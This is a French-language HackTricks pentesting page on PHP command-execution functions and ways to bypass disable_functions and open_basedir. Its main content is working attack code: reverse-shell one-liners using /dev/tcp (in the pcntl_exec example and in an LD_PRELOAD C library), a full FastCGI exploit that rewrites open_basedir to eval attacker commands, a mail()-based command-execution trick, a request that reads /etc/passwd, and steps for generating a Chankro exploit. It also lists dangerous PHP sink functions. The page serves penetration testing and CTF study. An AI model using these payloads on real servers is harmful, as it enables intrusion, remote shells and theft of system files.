# PHP - Fonctions Utiles & contournement de disable_functions/open_basedir

{{#include ../../../../banners/hacktricks-training.md}}

## Exécution de Commandes & Code PHP

### Exécution de Commandes PHP

**Remarque :** Un [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell peut **automatiquement** vérifier et contourner la fonction suivante si certaines d'entre elles sont désactivées.

**exec** - Renvoie la dernière ligne de la sortie des commandes
```bash
echo exec("uname  -a");
```
**passthru** - Passe la sortie des commandes directement au navigateur
```bash
echo passthru("uname -a");
```
**system** - Passe la sortie des commandes directement au navigateur et renvoie la dernière ligne
```bash
echo system("uname -a");
```
**shell_exec** - Renvoie la sortie des commandes
```bash
echo shell_exec("uname -a");
```
\`\` (backticks) - Identique à shell_exec()
```bash
echo `uname -a`
```
**popen** - Ouvre un pipe de lecture ou d'écriture vers le processus d'une commande
```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```
**proc_open** - Semblable à popen() mais avec un plus grand degré de contrôle
```bash
proc_close(proc_open("uname -a",array(),$something));
```
**preg_replace**
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
**pcntl_exec** - Exécute un programme (par défaut dans les versions modernes et moins modernes de PHP, vous devez charger le module `pcntl.so` pour utiliser cette fonction)
```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```
**mail / mb_send_mail** - Cette fonction est utilisée pour envoyer des mails, mais elle peut également être abusée pour injecter des commandes arbitraires dans le paramètre `$options`. Cela est dû au fait que la **fonction `mail` de php** appelle généralement le binaire `sendmail` à l'intérieur du système et vous permet de **mettre des options supplémentaires**. Cependant, vous ne pourrez pas voir la sortie de la commande exécutée, il est donc recommandé de créer un script shell qui écrit la sortie dans un fichier, de l'exécuter en utilisant mail, et d'imprimer la sortie :
```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```
**dl** - Cette fonction peut être utilisée pour charger dynamiquement une extension PHP. Cette fonction ne sera pas toujours présente, donc vous devriez vérifier si elle est disponible avant d'essayer de l'exploiter. Lisez [cette page pour apprendre à exploiter cette fonction](disable_functions-bypass-dl-function.md).

### Exécution de code PHP

En plus de eval, il existe d'autres moyens d'exécuter du code PHP : include/require peuvent être utilisés pour l'exécution de code à distance sous la forme de vulnérabilités Local File Include et Remote File Include.
```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```
## disable_functions & open_basedir

**Les fonctions désactivées** est le paramètre qui peut être configuré dans les fichiers `.ini` en PHP qui **interdit** l'utilisation des **fonctions** indiquées. **Open basedir** est le paramètre qui indique à PHP le dossier auquel il peut accéder.\
Le paramètre PHP doit être configuré dans le chemin _/etc/php7/conf.d_ ou similaire.

Les deux configurations peuvent être vues dans la sortie de **`phpinfo()`** :

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../images/image (493).png>)

## open_basedir Bypass

`open_basedir` configurera les dossiers auxquels PHP peut accéder, vous **ne pourrez pas écrire/lire/exécuter de fichier en dehors** de ces dossiers, mais vous **ne pourrez même pas lister** d'autres répertoires.\
Cependant, si d'une manière ou d'une autre vous parvenez à exécuter du code PHP arbitraire, vous pouvez **essayer** le morceau de **codes** suivant pour essayer de **contourner** la restriction.

### Listing dirs with glob:// bypass

Dans ce premier exemple, le protocole `glob://` avec un contournement de chemin est utilisé :
```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```
**Note1**: Dans le chemin, vous pouvez également utiliser `/e??/*` pour lister `/etc/*` et tout autre dossier.\
**Note2**: Il semble qu'une partie du code soit dupliquée, mais c'est en fait nécessaire !\
**Note3**: Cet exemple est uniquement utile pour lister des dossiers, pas pour lire des fichiers.

### Contournement complet de open_basedir en abusant de FastCGI

Si vous voulez **en savoir plus sur PHP-FPM et FastCGI**, vous pouvez lire la [première section de cette page](disable_functions-bypass-php-fpm-fastcgi.md).\
Si **`php-fpm`** est configuré, vous pouvez en abuser pour contourner complètement **open_basedir** :

![](<../../../../images/image (545).png>)

![](<../../../../images/image (577).png>)

Notez que la première chose que vous devez faire est de trouver où se trouve le **socket unix de php-fpm**. Il se trouve généralement sous `/var/run`, donc vous pouvez **utiliser le code précédent pour lister le répertoire et le trouver**.\
Code de [ici](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy).
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Bad request');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('This app can\'t multiplex [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('New request rejected; too busy [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Role value not known [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// real exploit start here
if (!isset($_REQUEST['cmd'])) {
die("Check your input\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // php payload -- Doesnt do anything
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```
Ces scripts communiqueront avec le **socket unix de php-fpm** (généralement situé dans /var/run si fpm est utilisé) pour exécuter du code arbitraire. Les paramètres `open_basedir` seront écrasés par l'attribut **PHP_VALUE** qui est envoyé.\
Notez comment `eval` est utilisé pour exécuter le code PHP que vous envoyez dans le paramètre **cmd**.\
Notez également la **ligne commentée 324**, vous pouvez la décommenter et le **payload se connectera automatiquement à l'URL donnée et exécutera le code PHP** qui s'y trouve.\
Il suffit d'accéder à `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` pour obtenir le contenu du fichier `/etc/passwd`.

> [!WARNING]
> Vous pourriez penser que de la même manière que nous avons écrasé la configuration `open_basedir`, nous pouvons **écraser `disable_functions`**. Eh bien, essayez-le, mais cela ne fonctionnera pas, apparemment **`disable_functions` ne peut être configuré que dans un fichier de configuration `.ini` php** et les modifications que vous effectuez en utilisant PHP_VALUE ne seront pas efficaces sur ce paramètre spécifique.

## Bypass de disable_functions

Si vous parvenez à exécuter du code PHP à l'intérieur d'une machine, vous voudrez probablement passer au niveau supérieur et **exécuter des commandes système arbitraires**. Dans cette situation, il est courant de découvrir que la plupart ou toutes les **fonctions** PHP qui permettent d'**exécuter des commandes système ont été désactivées** dans **`disable_functions`.**\
Voyons donc comment vous pouvez contourner cette restriction (si vous le pouvez).

### Découverte automatique de contournement

Vous pouvez utiliser l'outil [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser) et il vous indiquera quelle fonction (le cas échéant) vous pouvez utiliser pour **contourner** **`disable_functions`**.

### Contournement en utilisant d'autres fonctions système

Retournez simplement au début de cette page et **vérifiez si l'une des fonctions d'exécution de commandes n'est pas désactivée et disponible dans l'environnement**. Si vous en trouvez juste une, vous pourrez l'utiliser pour exécuter des commandes système arbitraires.

### Bypass LD_PRELOAD

Il est bien connu que certaines fonctions en PHP comme `mail()` vont **exécuter des binaires à l'intérieur du système**. Par conséquent, vous pouvez en abuser en utilisant la variable d'environnement `LD_PRELOAD` pour les faire charger une bibliothèque arbitraire qui peut exécuter n'importe quoi.

#### Fonctions pouvant être utilisées pour contourner disable_functions avec LD_PRELOAD

- **`mail`**
- **`mb_send_mail`** : Efficace lorsque le module `php-mbstring` est installé.
- **`imap_mail`** : Fonctionne si le module `php-imap` est présent.
- **`libvirt_connect`** : Nécessite le module `php-libvirt-php`.
- **`gnupg_init`** : Utilisable avec le module `php-gnupg` installé.
- **`new imagick()`** : Cette classe peut être abusée pour contourner les restrictions. Des techniques d'exploitation détaillées peuvent être trouvées dans un [**writeup complet ici**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Vous pouvez [**trouver ici**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) le script de fuzzing qui a été utilisé pour trouver ces fonctions.

Voici une bibliothèque que vous pouvez compiler pour abuser de la variable d'environnement `LD_PRELOAD` :
```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```
#### Bypass utilisant Chankro

Afin d'abuser de cette mauvaise configuration, vous pouvez [**Chankro**](https://github.com/TarlogicSecurity/Chankro). C'est un outil qui va **générer un exploit PHP** que vous devez télécharger sur le serveur vulnérable et l'exécuter (y accéder via le web).\
**Chankro** écrira à l'intérieur du disque des victimes la **bibliothèque et le reverse shell** que vous souhaitez exécuter et utilisera le\*\*`LD_PRELOAD` trick + la fonction PHP `mail()`\*\* pour exécuter le reverse shell.

Notez que pour utiliser **Chankro**, `mail` et `putenv` **ne peuvent pas apparaître dans la liste `disable_functions`**.\
Dans l'exemple suivant, vous pouvez voir comment **créer un exploit chankro** pour **arch 64**, qui exécutera `whoami` et enregistrera la sortie dans _/tmp/chankro_shell.out_, chankro va **écrire la bibliothèque et le payload** dans _/tmp_ et l'**exploit final** sera appelé **bicho.php** (c'est le fichier que vous devez télécharger sur le serveur des victimes) :

{{#tabs}}
{{#tab name="shell.sh"}}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{{#endtab}}

{{#tab name="Chankro"}}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{{#endtab}}
{{#endtabs}}

Si vous constatez que la fonction **mail** est bloquée par des fonctions désactivées, vous pouvez toujours utiliser la fonction **mb_send_mail.**\
Plus d'informations sur cette technique et Chankro ici : [https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable_functions-and-open_basedir/)

### "Bypass" utilisant les capacités de PHP

Notez qu'en utilisant **PHP**, vous pouvez **lire et écrire des fichiers, créer des répertoires et changer les permissions**.\
Vous pouvez même **dumper des bases de données**.\
Peut-être qu'en utilisant **PHP** pour **énumérer** la machine, vous pouvez trouver un moyen d'escalader les privilèges/exécuter des commandes (par exemple, lire une clé ssh privée).

J'ai créé un webshell qui facilite beaucoup l'exécution de ces actions (notez que la plupart des webshells vous offriront également ces options) : [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Bypasses dépendants des modules/versions

Il existe plusieurs façons de contourner disable_functions si un module spécifique est utilisé ou d'exploiter une version spécifique de PHP :

- [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable_functions-bypass-php-fpm-fastcgi.md)
- [**Bypass avec FFI - Interface de Fonction Étrangère activée**](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/broken-reference/README.md)
- [**Bypass via mem**](disable_functions-bypass-via-mem.md)
- [**mod_cgi**](disable_functions-bypass-mod_cgi.md)
- [**Extension PHP Perl Safe_mode**](disable_functions-bypass-php-perl-extension-safe_mode-bypass-exploit.md)
- [**dl function**](disable_functions-bypass-dl-function.md)
- [**Cet exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
- 5.\* - exploitable avec des modifications mineures au PoC
- 7.0 - toutes les versions à ce jour
- 7.1 - toutes les versions à ce jour
- 7.2 - toutes les versions à ce jour
- 7.3 - toutes les versions à ce jour
- 7.4 - toutes les versions à ce jour
- 8.0 - toutes les versions à ce jour
- [**De 7.0 à 8.0 exploit (Unix uniquement)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
- [**PHP 7.0=7.4 (\*nix)**](disable_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
- [**Imagick 3.3.0 PHP >= 5.4**](disable_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
- [**PHP 5.x Shellsock**](disable_functions-php-5.x-shellshock-exploit.md)
- [**PHP 5.2.4 ionCube**](disable_functions-php-5.2.4-ioncube-extension-exploit.md)
- [**PHP <= 5.2.9 Windows**](disable_functions-bypass-php-less-than-5.2.9-on-windows.md)
- [**PHP 5.2.4/5.2.5 cURL**](disable_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
- [**PHP 5.2.3 -Win32std**](disable_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
- [**Exploitation FOpen PHP 5.2**](disable_functions-bypass-php-5.2-fopen-exploit.md)
- [**PHP 4 >= 4.2.-, PHP 5 pcntl_exec**](disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.md)

### **Outil Automatique**

Le script suivant essaie certaines des méthodes commentées ici :\
[https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass_Disable_functions_Shell/blob/master/shell.php)

## Autres fonctions PHP intéressantes

### Liste des fonctions qui acceptent des callbacks

Ces fonctions acceptent un paramètre de chaîne qui pourrait être utilisé pour appeler une fonction au choix de l'attaquant. Selon la fonction, l'attaquant peut ou non avoir la possibilité de passer un paramètre. Dans ce cas, une fonction de divulgation d'informations comme phpinfo() pourrait être utilisée.

[Callbacks / Callables](https://www.php.net/manual/en/language.types.callable.php)

[Suivant les listes d'ici](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```
### Divulgation d'informations

La plupart de ces appels de fonction ne sont pas des puits. Mais cela peut constituer une vulnérabilité si des données retournées sont visibles par un attaquant. Si un attaquant peut voir phpinfo(), c'est définitivement une vulnérabilité.
```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```
### Autre
```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```
### Fonctions de Système de Fichiers

Selon RATS, toutes les fonctions de système de fichiers en php sont nuisibles. Certaines d'entre elles ne semblent pas très utiles pour l'attaquant. D'autres sont plus utiles que vous ne le pensez. Par exemple, si allow_url_fopen=On, alors une URL peut être utilisée comme chemin de fichier, donc un appel à copy($\_GET\['s'], $\_GET\['d']); peut être utilisé pour télécharger un script PHP n'importe où sur le système. De plus, si un site est vulnérable à une requête envoyée via GET, chacune de ces fonctions de système de fichiers peut être abusée pour canaliser une attaque vers un autre hôte à travers votre serveur.

**Gestionnaire de système de fichiers ouvert**
```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```
**Écrire dans le système de fichiers (partiellement en combinaison avec la lecture)**
```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```
**Lire à partir du système de fichiers**
```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```
{{#include ../../../../banners/hacktricks-training.md}}
